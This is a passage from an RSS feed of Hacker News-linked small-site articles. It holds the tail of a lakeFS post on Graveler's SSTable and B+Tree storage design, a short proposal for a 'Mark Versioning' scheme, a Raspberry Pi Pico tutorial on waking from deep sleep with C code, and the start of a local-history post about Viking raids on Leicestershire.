<ul><li><strong>Fully sequential </strong>(rare): When delivering a full listing of objects, or when computing a diff or merge of very different commits.</li><li><strong>Sequential with random skips</strong>: When listing objects with paths matching a particular prefix, or when computing a diff or merge of rather similar commits.</li><li><strong>Random but local skips</strong>: A typical “big data” application will access particular subsets of paths, and access paths within each subset in roughly lexicographical order.</li><li><strong>Random</strong>: When accessing a single file.</li></ul>



<p>So SSTables are a good fit for committed data in lakeFS, just as it is for unchanging data in many other object stores.&nbsp; Indeed, Git stores its files in tree objects — essentially per-directory SSTables.</p>



<p>Picking “good” object sizes requires benchmarking.  We use the very comprehensive S3 benchmark numbers from <a href="https://github.com/dvassallo/s3-benchmark">github.com/dvassallo/s3-benchmark</a>.</p>



<p>Time to download a file from an object store can roughly be modelled as <em>t<sub>initial</sub> + size/bandwidth</em>: a roughly fixed cost to start downloading, followed by time to download all remaining bytes.&nbsp; Here are some of dvassallo’s numbers for times achieved for 10 threads running on c5.4xlarge instances.&nbsp;<em>t<sub>initial</sub></em> is roughly the <em>time to request</em>.</p>


<figure>
<table>
<thead>
<tr>
<th rowspan="2">Instance type</th>
<th rowspan="2">Payload (KiB)</th>
<th rowspan="2">Threads</th>
<th rowspan="2">Rate (Mib/s)</th>
<th colspan="2">Request time (msec)</th>
<th colspan="2">Response time (msec)</th>
</tr>
<tr>
<th>(p90)</th>
<th>(p99)</th>
<th>(p90)</th>
<th>(p99)</th>
</tr>
</thead>
<tbody>
<tr>
<td>c5.18xlarge</td>
<td>128</td>
<td>10</td>
<td>84.477</td>
<td>16.4</td>
<td>46.9</td>
<td>18.2</td>
<td>48.2</td>
</tr>
<tr>
<td>c5.18xlarge</td>
<td>256</td>
<td>10</td>
<td>156.162</td>
<td>16.7</td>
<td>50.7</td>
<td>20.4</td>
<td>53.7</td>
</tr>
<tr>
<td>c5.18xlarge</td>
<td>512</td>
<td>10</td>
<td>241.555</td>
<td>18.2</td>
<td>48.3</td>
<td>24.7</td>
<td>102.7</td>
</tr>
<tr>
<td>c5.18xlarge</td>
<td>1024</td>
<td>10</td>
<td>443.879</td>
<td>16.6</td>
<td>50.8</td>
<td>25.7</td>
<td>82.9</td>
</tr>
<tr>
<td>c5.18xlarge</td>
<td>2048</td>
<td>10</td>
<td>714.105</td>
<td>15.8</td>
<td>43.1</td>
<td>34</td>
<td>73.3</td>
</tr>
<tr>
<td>c5.18xlarge</td>
<td>4096</td>
<td>10</td>
<td>815.543</td>
<td>16.5</td>
<td>70.3</td>
<td>55</td>
<td>116.2</td>
</tr>
<tr>
<td>c5.18xlarge</td>
<td>8192</td>
<td>10</td>
<td>893.252</td>
<td>15.3</td>
<td>39.2</td>
<td>89.2</td>
<td>136.1</td>
</tr>
<tr>
<td>c5.18xlarge</td>
<td>16384</td>
<td>10</td>
<td>922.756</td>
<td>15.4</td>
<td>56.1</td>
<td>171.8</td>
<td>203.4</td>
</tr>
<tr>
<td>c5.18xlarge</td>
<td>32768</td>
<td>10</td>
<td>926.44</td>
<td>14.8</td>
<td>53.8</td>
<td>347.2</td>
<td>394.3</td>
</tr>
</tbody>
</table>
</figure>


<pre><code><strong>A note on benchmarking S3</strong>
S3 timing is unfortunately not generally repeatable.&nbsp; These numbers represent the <em>lowest latency</em> I could measure over 3 regions (us-west-2, us-east-1, eu-central-1) over a few days.&nbsp; Other measured latencies were around 18-19 msec for 90th percentile of time to request.</code></pre>



<p>In all cases time to request is barely affected by object size&nbsp; At object sizes below 512 KiB it is comparable to the time to receive the entire object.&nbsp; So object sizes below 512 KiB are always less effective for our access patterns: taking into account that they perform more accesses, <em>they require strictly </em><strong><em>more</em></strong><em> time to fetch metadata on any number of files</em>.</p>



<p>Large objects are less effective for all access patterns that access only parts of the repository, they potentially fetch more data than needed.&nbsp; At the same time, graveler design allows us to <em>re-use shared objects</em> between SSTables for different commits.&nbsp; In order to do this we need those objects to be shared; this is easier to do with smaller objects: An object needs to be rewritten whenever it changes.&nbsp; So splitting an SSTable between more objects makes each object more re-usable.</p>



<p>In light of this, we designed graveler to use object sizes of 1-10 MiB.</p>



<h2>Lightweight B+Trees</h2>



<p>A repository can contain hundreds of millions of objects at a single commit.&nbsp; Git overloads the directory structure of the files in the repository in order to determine <em>tree objects</em>.&nbsp; Each tree object holds a single directory, linking to additional tree objects for subdirectories.</p>



<p>lakeFS data repositories are somewhat different from Git source code repositories.&nbsp; Firstly, they tend to have orders of magnitude <em>more</em> objects – even billions of objects.&nbsp; But performance of directory scans is much <em>less</em> important in data lakes than performance of sequential scans, and directory structures can be very deep (8 or more levels are common).&nbsp; This allows us to separate concerns differently.</p>



<p>Graveler stores a sorted list of key-value pairs in multiple consecutive files.&nbsp; “Leaf” files are termed <em>ranges</em>.&nbsp; These hold the actual values: path to object on underlying object store and additional per-object metadata.&nbsp; We try to keep leaf files to have sizes in the range on 1-10 MiB.&nbsp; The different ranges hold non-overlapping ranges of keys.&nbsp; The list of references to range objects is stored in a separate file termed a <em>metarange</em>.&nbsp; It holds the range files in order of their keys, indexed by last key.</p>



<p>So the graveler SSTable is stored pretty much as a <a href="https://en.wikipedia.org/wiki/B%2B_tree">B+Tree</a> with 2 levels: a root (metarange) and leaf nodes (ranges).&nbsp; Internal nodes are identified by digests of their contents, making this a <a href="https://en.wikipedia.org/wiki/Merkle_tree"><em>Merkle tree</em></a>.&nbsp; Nodes with the same contents receive identical identifiers, allowing for re-using nodes between similar trees as well as constant-time comparisons.</p>



<h3>Only 2 levels?</h3>



<p>We <em>do not currently limit the size of metarange files</em>.&nbsp; A typical object entry is &lt;512 bytes, so a 10 MiB range file can hold 20K object entries.&nbsp; Given that we have more control over names of range file objects, a 10 MiB metarange file can hold rather more than 20K object entries, for a total of 400M object entries.<br>What happens if the metarange file is too large?&nbsp; We just keep it large.&nbsp; It turns out that we do not lose much!&nbsp; Almost all of the nodes in any B+Tree are near the leaves.&nbsp; The massive branching-factor of our nodes means that we would add at most 1 level if we split the metarange file: even splitting the root into just 100 entries would give a graveler file capable of holding 40G object entries.&nbsp; The gains from adding intermediate nodes are not much: a minimal increase in caching and dedupe efficiency (almost all of the cache and dedupe are for ranges, not metaranges), in exchange for <em>no</em> reduction in latency (all accesses would now require 3 steps rather than 2 as before).</p>



<pre><code><strong>A note about Git packfiles
</strong>As mentioned above, Git holds many more tree objects per file than we hold range objects.&nbsp; It reduces the number of files that it needs to access by collecting small objects into “pack files”.&nbsp; This significantly reduces the total size of repository metadata, and allows it to regain much of …</code></pre></div></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://lakefs.io/concrete-graveler-committing-data-to-pebbledb-sstables/">https://lakefs.io/concrete-graveler-committing-data-to-pebbledb-sstables/</a></em></p>]]>
            </description>
            <link>https://lakefs.io/concrete-graveler-committing-data-to-pebbledb-sstables/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26212772</guid>
            <pubDate>Sun, 21 Feb 2021 11:48:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mark Versioning: social versioning with semantic guarantees]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26212711">thread link</a>) | @isaacimagine
<br/>
February 21, 2021 | https://www.slightknack.dev/mark-versioning | <a href="https://web.archive.org/web/*/https://www.slightknack.dev/mark-versioning">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <div class="page">
    
    <hr>
    <p>Semantic Versioning is better than most Versioning systems today, but because it means different things to different people, it remains more of a Social Versioning system than a semantic one.</p>
<p>I propose a new Versioning Scheme named Mark Versioning, which aims to separate and preserve both social and semantic aspects of versioning.</p>
<p>A <em>Mark</em> is a specific version of a software. This number is decided by social consensus, and represents major iterations / changes to a software. It starts at 0 and is incremented by 1 whenever appropriate.</p>
<p>A <em>Revision</em> is similar to a Mark, but it represents a strict change in API. This may be a breaking or a no breaking change. Reversions start at 0 for each mark, and are incremented by one whenever an API change is detected. This should be done automatically by package management software.</p>
<p>A <em>Hash</em> is the particular SHA-3 hash (in hex form, truncated to 8 characters) of a the source code of a software version. A Revision may have multiple different hashes. Alternatively, one can start from 0 with each Revision and automatically increment by 1 with each change. This should be done automatically.</p>
<p>Mark Versioning can be written out in two forms: long and short.</p>
<p>Long form: </p>
<pre><code>Mark &lt;X&gt; Revision &lt;Y&gt; Hash &lt;zzzzzzzz&gt;
</code></pre>
<p>Short form:</p>
<pre><code>m&lt;X&gt;r&lt;Y&gt;#&lt;zzzzzzzz&gt;
</code></pre>
<p>Here are some examples:</p>
<pre><code>Mark 3 Revision 16 Hash ae473ff6
</code></pre>
<p>Same in short form:</p>
<pre><code>m3r16#ae473ff6
</code></pre>
<p>Optionally, one can leave off Hash or Hash and Revision (if Hash is present, Revision must be present):</p>
<pre><code>Mark 0
Mark 0 Revision 0
Mark 0 Revision 0 Hash 0

m0
m0r0
m0r0#0
</code></pre>
<p>That's all.</p>

</div>
            <!-- Shows Nested Pages -->
            
            <!-- <h1>Note</h1>
            <p>
                I'm usually pretty permissive with what I create.
                However, my writing is my writing and my opinions are my own.
                Although this <em>website's</em> source code is released under
                the <strong>MIT</strong> License,
                all published <em>content</em> is © Isaac Clayton.
            </p> -->
            <!--
                why are you looking through this page's html?
                it's nothing special.
                Have a nice day 😘.
            -->
        </div></div>]]>
            </description>
            <link>https://www.slightknack.dev/mark-versioning</link>
            <guid isPermaLink="false">hacker-news-small-sites-26212711</guid>
            <pubDate>Sun, 21 Feb 2021 11:35:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Awaking the Raspberry Pico from deep sleep]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26212270">thread link</a>) | @ghubcoder
<br/>
February 21, 2021 | https://ghubcoder.github.io/posts/awaking-the-pico/ | <a href="https://web.archive.org/web/*/https://ghubcoder.github.io/posts/awaking-the-pico/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h3 id="awaking-the-raspberry-pico-from-deep-sleep">Awaking the Raspberry Pico from deep sleep</h3><p>The Raspberry Pico was released in Jan 2021, and retails for around $4. It has a Dual-core Arm Cortex-M0+ processor (RP2040), flexible clock running up to 133 MHz and 264KB internal RAM.</p><p>This is a short overview of how you might reduce the power consumption of your Pico to a very low level, around 1.3mA at 25c according to the official <a href="https://datasheets.raspberrypi.org/pico/pico-datasheet.pdf">datasheet</a>.</p><p>This is useful for periodically performing some work, consuming minimal power whilst we are sleeping.</p><p>Sleeping is fairly simple, but there were a few extra steps required to bring the Pico back to full functionality once it’s awake.</p><h3 id="choosing-a-sleep-mode">Choosing a sleep mode</h3><p>There appear to be two different sleep modes, a <code>dormant</code> mode and a <code>sleep</code> mode. Read more about them from a programming perspective <a href="https://datasheets.raspberrypi.org/rp2040/rp2040-datasheet.pdf">here</a> in the <code>2.11.5. Programmer’s Model</code> section.</p><p>The dormant mode uses even less power 0.8mA at 25c, however it appears to require the use of an external trigger to bring the Pico back out of sleep.</p><p>To use dormant mode, they use the following function in <a href="https://github.com/raspberrypi/pico-playground/blob/master/sleep/hello_dormant/hello_dormant.c#L28">their</a> example:</p><div><pre><code data-lang="c"><span>// Go to sleep until we see a high edge on GPIO 10
</span><span></span>sleep_goto_dormant_until_edge_high(<span>10</span>);
</code></pre></div><p>If you want to purely rely on the internal clock of the Pico to trigger it to awaken, we’re going to have to use the <code>sleep</code> mode, using slightly more power.</p><h3 id="example-sleep-code">Example sleep code</h3><p>Lets take a look then at the sleep <a href="https://github.com/raspberrypi/pico-playground/blob/master/sleep/hello_sleep/hello_sleep.c">example</a> from the pico-playground:</p><div><pre><code data-lang="c"><span>int</span> <span>main</span>() {
    stdio_init_all();
    printf(<span>"Hello Sleep!</span><span>\n</span><span>"</span>);

    printf(<span>"Switching to XOSC</span><span>\n</span><span>"</span>);

    <span>// Wait for the fifo to be drained so we get reliable output
</span><span></span>    uart_default_tx_wait_blocking();

    <span>// UART will be reconfigured by sleep_run_from_xosc
</span><span></span>    sleep_run_from_xosc();

    printf(<span>"Switched to XOSC</span><span>\n</span><span>"</span>);

    awake <span>=</span> false;

    <span>//At this point the pico will sleep
</span><span></span>    rtc_sleep();

    <span>//We won't hit this part of the code until the 
</span><span></span>    <span>//time set in rtc_sleep() is reached. 
</span><span></span>    <span>// Make sure we don't wake
</span><span></span>    <span>while</span> (<span>!</span>awake) {
        printf(<span>"Should be sleeping</span><span>\n</span><span>"</span>);
    }

    <span>return</span> <span>0</span>;
}
</code></pre></div><p>The above makes a call to <code>rtc_sleep()</code> which sets everything up and then sleeps for 10 seconds:</p><div><pre><code data-lang="c"><span>static</span> <span>void</span> <span>rtc_sleep</span>(<span>void</span>) {
    <span>// Start on Friday 5th of June 2020 15:45:00
</span><span></span>    datetime_t t <span>=</span> {
            .year  <span>=</span> <span>2020</span>,
            .month <span>=</span> <span>06</span>,
            .day   <span>=</span> <span>05</span>,
            .dotw  <span>=</span> <span>5</span>, <span>// 0 is Sunday, so 5 is Friday
</span><span></span>            .hour  <span>=</span> <span>15</span>,
            .min   <span>=</span> <span>45</span>,
            .sec   <span>=</span> <span>00</span>
    };

    <span>// Alarm 10 seconds later
</span><span></span>    datetime_t t_alarm <span>=</span> {
            .year  <span>=</span> <span>2020</span>,
            .month <span>=</span> <span>06</span>,
            .day   <span>=</span> <span>05</span>,
            .dotw  <span>=</span> <span>5</span>, <span>// 0 is Sunday, so 5 is Friday
</span><span></span>            .hour  <span>=</span> <span>15</span>,
            .min   <span>=</span> <span>45</span>,
            .sec   <span>=</span> <span>10</span>
    };

    <span>// Start the RTC
</span><span></span>    rtc_init();
    rtc_set_datetime(<span>&amp;</span>t);

    printf(<span>"Sleeping for 10 seconds</span><span>\n</span><span>"</span>);
    uart_default_tx_wait_blocking();

    sleep_goto_sleep_until(<span>&amp;</span>t_alarm, <span>&amp;</span>sleep_callback);
}

</code></pre></div><p>All fairly straight forward, and if you run this it works as expected. This line:</p><div><pre><code data-lang="c">printf(<span>"Should be sleeping</span><span>\n</span><span>"</span>);
</code></pre></div><p>Is never printed as by the time we reach this point in the code, the sleep callback is triggered on awaking, setting <code>awake</code> to true:</p><div><pre><code data-lang="c"><span>static</span> <span>void</span> <span>sleep_callback</span>(<span>void</span>) {
    printf(<span>"RTC woke us up</span><span>\n</span><span>"</span>);
    awake <span>=</span> true;
}
</code></pre></div><h3 id="fantastic-all-sorted">Fantastic! All sorted?</h3><p>Unfortunately this is not the whole story, we don’t wake up in a great state. Though at first everything seems fine.</p><p>Lets say we expand on the code in the example above, and we try to sleep again using the regular <code>sleep_ms</code> method the Pico SDK provides:</p><div><pre><code data-lang="c">    <span>//We won't hit this part of the code until the 
</span><span></span>    <span>//time set in rtc_sleep() is reached. 
</span><span></span>    <span>// Make sure we don't wake
</span><span></span>    <span>while</span> (<span>!</span>awake) {
        printf(<span>"Should be sleeping</span><span>\n</span><span>"</span>);
    }

    printf(<span>"switch on the onboard LED</span><span>\n</span><span>"</span>);
    uart_default_tx_wait_blocking();
    gpio_put(LED_PIN, <span>1</span>);

    printf(<span>"Sleep from sleep_ms</span><span>\n</span><span>"</span>);
    uart_default_tx_wait_blocking();

    <span>//We hang at this point forever
</span><span></span>    sleep_ms(<span>2000</span>);

    printf(<span>"Switch off LED</span><span>\n</span><span>"</span>);
    uart_default_tx_wait_blocking();
    gpio_put(LED_PIN, <span>0</span>);

    <span>return</span> <span>0</span>;
</code></pre></div><p>What happens is we hang at the <code>sleep_ms</code> command.</p><h3 id="whats-going-on-here">What’s going on here?</h3><p>Lets follow through the function calls <code>rtc_sleep</code> is making and see what’s being changed to allow us to enter this deep sleep state.
One of the functions we call is <code>sleep_run_from_xosc()</code>, this sets up the Pico to run from the internal Crystal Oscillator.</p><p>Following that through we end up in <a href="https://github.com/raspberrypi/pico-extras/blob/f5c7be9a86e3131cd13d2cc3493b84b23676f8c4/src/rp2_common/pico_sleep/sleep.c#L65">this</a> area of the code:</p><div><pre><code data-lang="c">    <span>// CLK SYS = CLK_REF
</span><span></span>    clock_configure(clk_sys,
                    CLOCKS_CLK_SYS_CTRL_SRC_VALUE_CLK_REF,
                    <span>0</span>, <span>// Using glitchless mux
</span><span></span>                    src_hz,
                    src_hz);

    <span>// CLK USB = 0MHz
</span><span></span>    clock_stop(clk_usb);

    <span>// CLK ADC = 0MHz
</span><span></span>    clock_stop(clk_adc);
</code></pre></div><p>So it seems we’re reconfiguring the system clock, and stopping a few of the other clocks. Could that be why we’re not able to sleep correctly later?
Thankfully an <a href="https://raspberrypi.github.io/pico-sdk-doxygen/group__hardware__clocks.html">example</a> in the SDK docs gives us a away to check what the internal clocks are set to.</p><p>We can print these values out before and after sleeping, and see how it looks.</p><h3 id="disabled-clocks">Disabled clocks</h3><p>Before sleeping:</p><div><pre><code data-lang="text">pll_sys  = 125001kHz
pll_usb  = 48000kHz
rosc     = 4689kHz
clk_sys  = 125000kHz
clk_peri = 125000kHz
clk_usb  = 48000kHz
clk_adc  = 48000kHz
clk_rtc  = 47kHz
</code></pre></div><p>After sleeping:</p><div><pre><code data-lang="text">pll_sys  = 0kHz
pll_usb  = 0kHz
rosc     = 0kHz
clk_sys  = 12000kHz
clk_peri = 12000kHz
clk_usb  = 0kHz
clk_adc  = 0kHz
clk_rtc  = 47kHz
</code></pre></div><p>That’s probably not helping. There is actually a <code>clocks_init</code> <a href="https://github.com/raspberrypi/pico-sdk/blob/26653ea81e340cacee55025d110c3e014a252a87/src/rp2_common/hardware_clocks/clocks.c#L117">function</a> provided by the SDK, however when trying to call that after sleeping, it will just hang.</p><p>By creating a new function, and picking out some of the commands from <code>clocks_init</code>, some of the clocks could be reset.</p><div><pre><code data-lang="text">pll_sys  = 125000kHz
pll_usb  = 48000kHz
rosc     = 0kHz
clk_sys  = 12000kHz
clk_peri = 12000kHz
clk_usb  = 48000kHz
clk_adc  = 48000kHz
clk_rtc  = 47kHz
</code></pre></div><p>However, trying to reset the system clock would seem to hang:</p><div><pre><code data-lang="c">clock_configure(clk_sys,
                    CLOCKS_CLK_SYS_CTRL_SRC_VALUE_CLKSRC_CLK_SYS_AUX,
                    CLOCKS_CLK_SYS_CTRL_AUXSRC_VALUE_CLKSRC_PLL_SYS,
                    <span>125</span> <span>*</span> MHZ,
                    <span>125</span> <span>*</span> MHZ);
</code></pre></div><p>As the ring oscillator is still disabled, lets see if we can bring that back to a good state. It’s being disabled in <a href="https://github.com/raspberrypi/pico-extras/blob/f5c7be9a86e3131cd13d2cc3493b84b23676f8c4/src/rp2_common/pico_sleep/sleep.c#L95">this</a> part of the code. Which does the following:</p><div><pre><code data-lang="c"><span>void</span> <span>rosc_disable</span>(<span>void</span>) {
    uint32_t tmp <span>=</span> rosc_hw<span>-&gt;</span>ctrl;
    tmp <span>&amp;=</span> (<span>~</span>ROSC_CTRL_ENABLE_BITS);
    tmp <span>|=</span> (ROSC_CTRL_ENABLE_VALUE_DISABLE <span>&lt;&lt;</span> ROSC_CTRL_ENABLE_LSB);
    rosc_write(<span>&amp;</span>rosc_hw<span>-&gt;</span>ctrl, tmp);
    <span>// Wait for stable to go away
</span><span></span>    <span>while</span>(rosc_hw<span>-&gt;</span>status <span>&amp;</span> ROSC_STATUS_STABLE_BITS);
}
</code></pre></div><p>As a side note, the SDK has an interesting <a href="https://github.com/raspberrypi/pico-sdk/blob/26653ea81e340cacee55025d110c3e014a252a87/src/rp2040/hardware_regs/include/hardware/regs/rosc.h#L23">note</a> around disabling the ring oscillator before switching the system clock to run from another source.</p><div><pre><code data-lang="text">The system clock must be switched to another source before
setting this field to DISABLE otherwise the chip will lock up
</code></pre></div><p>Lets try and re-enable the ROSC:</p><div><pre><code data-lang="c">rosc_write(<span>&amp;</span>rosc_hw<span>-&gt;</span>ctrl, ROSC_CTRL_ENABLE_BITS);
</code></pre></div><p>At this point we can then run <code>clocks_init</code> and it no longer hangs, the clocks are then back to a similar state before sleeping, great!</p><div><pre><code data-lang="text">pll_sys  = 125000kHz
pll_usb  = 48000kHz
rosc     = 4675kHz
clk_sys  = 125000kHz
clk_peri = 125000kHz
clk_usb  = 48000kHz
clk_adc  = 48000kHz
clk_rtc  = 47kHz
</code></pre></div><h3 id="were-still-hanging">We’re still hanging</h3><p>Unfortunately though, we’re still hanging if we try and call sleep_ms after waking. Let’s go deeper into the code to see what happens when we actually <a href="https://github.com/raspberrypi/pico-playground/blob/master/sleep/hello_sleep/hello_sleep.c#L50">sleep</a>.</p><div><pre><code data-lang="c">sleep_goto_sleep_until(<span>&amp;</span>t_alarm, <span>&amp;</span>sleep_callback);
</code></pre></div><p>In <a href="https://github.com/raspberrypi/pico-extras/blob/f5c7be9a86e3131cd13d2cc3493b84b23676f8c4/src/rp2_common/pico_sleep/sleep.c#L110">this</a> function, all the clocks are being disabled apart from the Real Time Clock (we need this to wake us up):</p><div><pre><code data-lang="c">    <span>// Turn off all clocks when in sleep mode except for RTC
</span><span></span>    clocks_hw<span>-&gt;</span>sleep_en0 <span>=</span> CLOCKS_SLEEP_EN0_CLK_RTC_RTC_BITS;
    clocks_hw<span>-&gt;</span>sleep_en1 <span>=</span> <span>0x0</span>;
</code></pre></div><p>We’re then enabling deep sleeping on the processor:</p><div><pre><code data-lang="c">    uint save <span>=</span> scb_hw<span>-&gt;</span>scr;
    <span>// Enable deep sleep at the proc
</span><span></span>    scb_hw<span>-&gt;</span>scr <span>=</span> save <span>|</span> M0PLUS_SCR_SLEEPDEEP_BITS;
</code></pre></div><p>So it’s likely we’re going to need to reverse these settings as well to bring everything back to the pre-sleep state.
Lets create a function to bring everything back to the good state for us:</p><div><pre><code data-lang="c"><span>void</span> <span>recover_from_sleep</span>(uint scb_orig, uint clock0_orig, uint clock1_orig){

    <span>//Re-enable ring Oscillator control
</span><span></span>    rosc_write(<span>&amp;</span>rosc_hw<span>-&gt;</span>ctrl, ROSC_CTRL_ENABLE_BITS);

    <span>//reset procs back to default
</span><span></span>    scb_hw<span>-&gt;</span>scr <span>=</span> scb_orig;
    clocks_hw<span>-&gt;</span>sleep_en0 <span>=</span> clock0_orig;
    clocks_hw<span>-&gt;</span>sleep_en1 <span>=</span> clock1_orig;

    <span>//reset clocks
</span><span></span>    clocks_init();
    stdio_init_all();

    <span>return</span>;
}
</code></pre></div><p>Bringing it all together then we end up with the following:</p><div><pre><code data-lang="c"><span>int</span> <span>main</span>() {

    <span>const</span> uint LED_PIN <span>=</span> <span>25</span>;
    stdio_init_all();

    gpio_init(LED_PIN);
    gpio_set_dir(LED_PIN, GPIO_OUT);

    <span>//save values for later
</span><span></span>    uint scb_orig <span>=</span> scb_hw<span>-&gt;</span>scr;
    uint clock0_orig <span>=</span> clocks_hw<span>-&gt;</span>sleep_en0;
    uint clock1_orig <span>=</span> clocks_hw<span>-&gt;</span>sleep_en1;

    printf(<span>"Hello Sleep!</span><span>\n</span><span>"</span>);

    printf(<span>"Switching to XOSC</span><span>\n</span><span>"</span>);

    <span>// Wait for the fifo to be drained so we get reliable output
</span><span></span>    uart_default_tx_wait_blocking();

    <span>// UART will be reconfigured by sleep_run_from_xosc
</span><span></span>    sleep_run_from_xosc();

    printf(<span>"Switched to XOSC</span><span>\n</span><span>"</span>);

    awake <span>=</span> false;

    <span>//At this point the pico will sleep
</span><span></span>    rtc_sleep();

    <span>//We won't hit this part of the code until the 
</span><span></span>    <span>//time set in rtc_sleep() is reached. 
</span><span></span>    <span>// Make sure we don't wake
</span><span></span>    <span>while</span> (<span>!</span>awake) {
        printf(<span>"Should be sleeping</span><span>\n</span><span>"</span>);
    }

    <span>//reset processor and clocks back to defaults
</span><span></span>    recover_from_sleep(scb_orig, clock0_orig, clock1_orig);    
    
    printf(<span>"switch on the onboard LED</span><span>\n</span><span>"</span>);
    uart_default_tx_wait_blocking();
    gpio_put(LED_PIN, <span>1</span>);

    <span>//We no longer hang here!
</span><span></span>    sleep_ms(<span>2000</span>);

    printf(<span>"Switch off LED</span><span>\n</span><span>"</span>);
    uart_default_tx_wait_blocking();
    gpio_put(LED_PIN, <span>0</span>);

    <span>return</span> <span>0</span>;
}
</code></pre></div><p>Finally we no longer hang when calling <code>sleep_ms</code> after waking.</p><p>Full example with build instructions can be seen <a href="https://github.com/ghubcoder/PicoSleepDemo">here</a>.</p><p>Hopefully this has been somewhat interesting and perhaps will help someone else to wake their Pico after deep sleeping.</p></div></div></div>]]>
            </description>
            <link>https://ghubcoder.github.io/posts/awaking-the-pico/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26212270</guid>
            <pubDate>Sun, 21 Feb 2021 10:07:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Viking Invasion of Leicestershire (2012)]]>
            </title>
            <description>
<![CDATA[
Score 70 | Comments 101 (<a href="https://news.ycombinator.com/item?id=26212092">thread link</a>) | @zeristor
<br/>
February 21, 2021 | http://www.thiswasleicestershire.co.uk/2012/11/the-viking-invasion-of-leicestershire.html | <a href="https://web.archive.org/web/*/http://www.thiswasleicestershire.co.uk/2012/11/the-viking-invasion-of-leicestershire.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post-body-8898898974994971235" itemprop="description articleBody">
<p><span>We know exactly when the Viking Age
began in England – it was more than 1,200 years ago – on June 8, 793. That was
the day when invading Norsemen destroyed the Abbey church on the island of
Lindisfarne, off the north-east coast of England. Lindisfarne was a centre of
learning famous across the continent – but that meant nothing to these fierce
invaders.</span></p>
<table><tbody>
<tr><td><a href="http://3.bp.blogspot.com/-n4m_7H0fvSE/UKSycIixbvI/AAAAAAAAAfo/DAUUpjbSAwM/s1600/Viking+Leicester.jpg" imageanchor="1"><img height="212" src="https://3.bp.blogspot.com/-n4m_7H0fvSE/UKSycIixbvI/AAAAAAAAAfo/DAUUpjbSAwM/s320/Viking+Leicester.jpg" width="320"></a></td></tr>
<tr><td>The Vikings arrived in England in 793 AD</td></tr>
</tbody></table>
<p><span>Monks were either killed in the abbey,
thrown into the sea to drown or carried away as slaves – along with the church’s
treasures. The devastation of Northumbria’s Holy Island shocked Europe. “Never
before has such an atrocity been seen”, declared the Northumbrian scholar,
Alcuin of York. The Vikings had announced themselves in a devastating way. This
was just a warning of what was to come.</span></p>

<p><span>Over the next 300 years, more and more
invaders would flood into England, and Leicestershire would be full of Vikings.</span></p>

<p><b><span>Divided country</span></b></p>
<p><span>At the
time, England was not one united country – it was divided up into Anglo-Saxon
kingdoms.</span><b> </b><span>Leicester was
included within Mercia, and was known as Legreceastre. It was the principal
city in that kingdom. Even a thousand years ago and more, Legreceastre was a
bit of a melting pot.</span><b> </b><span>It
was a meeting point of several different cultures – the Angles from the Wash
and the Humber, Saxons from Warwickshire, Mercians from the Trent, and Celts
from the hills of Charnwood. In Leicester, they met, traded and eventually
settled.</span><b> </b><span>What increasingly
united these peoples was Christianity.</span><b>
</b><span>Mercia was Christian – the “new” religion reached Leicester in the
year 658. A church was said to have stood from the 7th century on the current
St Margaret’s site.</span><b> </b><span>Leicestershire,
as we know it, was in the heart of the Mercian kingdom and is thought to have
been the capital for political and ecclesiastical affairs. It was far enough
away from the frontiers to avoid changing hands as the unstable boundaries of
the mini-kingdom advanced and receded.</span><b>
</b><span>But what the Anglo-Saxons had worked so hard to build in
Leicestershire, was about to come to an end. The Scandinavian enemy was at the
gates and Mercia would never be the same again.</span></p>

<p><b><span>Ruthlessly pillaged</span></b></p>
<p><span>In 10 short years, between 865 and 874,
the whole structure of life in Mercia collapsed. A huge Scandinavian army
marched and pillaged up and down England. The Anglo-Saxon Chronicle has
preserved a glimpse of these years of chaos in its records of “a great heathen
army” that pillaged East Anglia in the year 865. Between 865 and 868 the
Northmen widened their field for plunder and tribute to East Mercia. Leicester
was attacked in 868, partly destroying the ancient Roman city walls.</span></p>

<p><span>Thousands of Danes swarmed down the
River Soar in their small, easily-managed boats, penetrating the very heart of
the country, carrying fire and sword among the simple and terrified population,
whom they ruthlessly pillaged and massacred. In the winter of 874 to 5, after
defeating Burhed, King of Mercia in battle, the raiders established their
quarters at Repton on the River Trent. Monasteries, the repositories of rich
and beautiful objects in gold, silver and jewellery, formed particular targets
for the pagan invaders. The monastery that had been founded at Breedon in
Leicestershire was reputedly sacked. But these Danes didn’t just hit and run,
like the early invaders on Lindisfarne.</span></p>

<table><tbody>
<tr><td><a href="http://3.bp.blogspot.com/-RAtAWAWsTdU/UKSybtWvK9I/AAAAAAAAAfc/l0Lz_w86CgM/s1600/Viking+Boat.jpg" imageanchor="1"><img height="243" src="https://3.bp.blogspot.com/-RAtAWAWsTdU/UKSybtWvK9I/AAAAAAAAAfc/l0Lz_w86CgM/s320/Viking+Boat.jpg" width="320"></a></td></tr>
<tr><td>The Vikings swarmed down the River Soar</td></tr>
</tbody></table>
<p><span>In its records of the year 877, the
Anglo-Saxon Chronicle suggests a permanent settlement of the land. The Danish
army it says “went into the land of the Mercians, and shared out some of it,
and gave some to Ceolwulf”. Ceolwulf was the puppet king whom the Danes placed
on the Mercian throne. It seems Mercia was now divided in half.</span></p>

<p><span>Large parts of its eastern territories
had passed into the hands of the Scandinavian invaders and were open to
settlement. Within the next decade, in 886, the losses of Anglo-Saxon territory
in Mercia were clearly defined by a treaty that King Alfred the Great concluded
with Guthrum, the leader of the Danes, after his Wessex Saxons had recaptured
London.</span></p>

<p><span>A permanent “country of Danes” was now
established within England, known as the Danelaw. This Danish part of England
comprised the greater part of eastern England from East Anglia to North
Yorkshire, incorporating most of Leicestershire. You could say that Leicester
was part of Denmark.</span></p>

<p><span>Leicestershire was close to the Danelaw
boundary though, and it is believed that some of the wealthier inhabitants
migrated with as many possessions as they could carry. As the churches were
destroyed and Christian rites trampled, the Bishop of Leicester retired to
